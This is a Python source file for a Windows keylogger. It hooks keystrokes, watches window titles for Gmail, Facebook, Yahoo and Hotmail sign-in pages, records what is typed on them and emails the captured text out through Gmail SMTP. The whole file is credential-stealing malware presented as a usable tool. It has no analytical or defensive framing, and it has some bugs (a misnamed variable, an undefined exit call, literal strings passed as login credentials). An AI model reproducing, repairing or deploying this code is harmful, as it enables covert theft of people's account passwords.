import sys, re, win32gui
import win32api
import win32console
import win32gui
import pythoncom,pyHook,time
from threading import Thread
import smtplib
import sys


winTitle = ""
logs=""
imp=""
flag=0
MAIL_ID=""
DEV_MAIL_ID=""
DEV_MAIL_PASS=""


def getWindowTitle():
    global winTitle
  
    winTitleText=win32gui.GetWindowText (win32gui.GetForegroundWindow())
    
    if(winTitleText != winTitle):
        winTitle = winTitleText
        print ">"+winTitle
        
        
def check_login():
    global flag, winTitle
    
    REG_HOT=re.compile( r'(^Sign In.*$)',re.I)
    REG_GMA=re.compile( r'(^Gmail.*$)',re.I)
    REG_FAC=re.compile( r'(^Welcome to Facebook.*$)',re.I)
    REG_YAH=re.compile( r'(^Yahoo - login.*$)',re.I)  
    while 1:
        getWindowTitle()
        if REG_HOT.match(winTitle) or REG_GMA.match(winTitle) or REG_FAC.match(winTitle) or REG_YAH.match(winTitle):
            flag=1
        else: 
            flag=0

    
     
#def OnKeyboardEvent(event):
#    if event.Ascii==5:
#        _exit(1)
#    if event.Ascii !=0 or 8:
#        if flag == 0:
##open output.txt to read current keystrokes
#            f=open('c:\New_Folder\output.txt','r+')
#            buffer=f.read()
#            f.close()
##open output.txt to write current + new keystrokes
#            f=open('c:\New_Folder\output.txt','w')
#            keylogs=chr(event.Ascii)
#            if event.Ascii==13:
#                keylogs='\n'
            
#            buffer+=keylogs
#            f.write(buffer)
#            f.close()


#        if flag == 1:
##open output.txt to read current keystrokes
#            f=open('c:\New_Folder\output1.txt','r+')
#            buffer=f.read()
#            f.close()
##open output.txt to write current + new keystrokes
#            f=open('c:\New_Folder\output1.txt','w')
#            keylogs=chr(event.Ascii)
#            if event.Ascii==13:
#                keylogs='\n'
            
#            buffer+=keylogs
#            f.write(buffer)
#            f.close()
def OnKeyboardEvent(event):
    global logs, imp
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:


        if flag == 1: 
            
            imp=imp+chr(event.Ascii)
            if event.Ascii==13:
                imps=imp+'\n'
        
def mail_me():
    global imp, MAIL_ID, flag
    mail_server = smtplib.SMTP('smtp.gmail.com:587') 
    mail_server.starttls()
    mail_server.login('DEV_MAIL_ID','DEV_MAIL_PASS')
    print "flag = "+ str(flag)
    print "imp = "+imp
    fr_add = DEV_MAIL_ID
    to_add = MAIL_ID
    if imp != '':
        mail_server.sendmail(fr_add, to_add, imp) 
        imp=''
    mail_server.close() 
             

def cont_mail():
    global flag
    while 1:
        if flag==1:
            while flag==1:
                pass
            mail_me()
             

def startKeyLogger():
    hm=pyHook.HookManager()
    hm.KeyDown=OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
       
     
def cont_check():
    while(1):
        getWindowTitle()

  
if __name__=="__main__": 
    
    if len(sys.argv) == 4 :
        MAIL_ID= sys.argv[1]
        DEV_MAIL_ID= sys.argv[2]
        DEV_MAIL_PASS= sys.argv[3]
        
    else:
        sys.exit("Usage: %s <email_id_which_receives_logs> <dev_email_id> <dev_email_pass>" % sys.argv[0])   
    check_l= Thread(target = check_login)
    check_l.start()
    
    check_w=Thread(target = cont_check)
    check_w.start()

    mail_thd= Thread(target = cont_mail)
    mail_thd.start()

    startKeyLogger()
    
    
        
           
                   
           

           
           
                                                         
        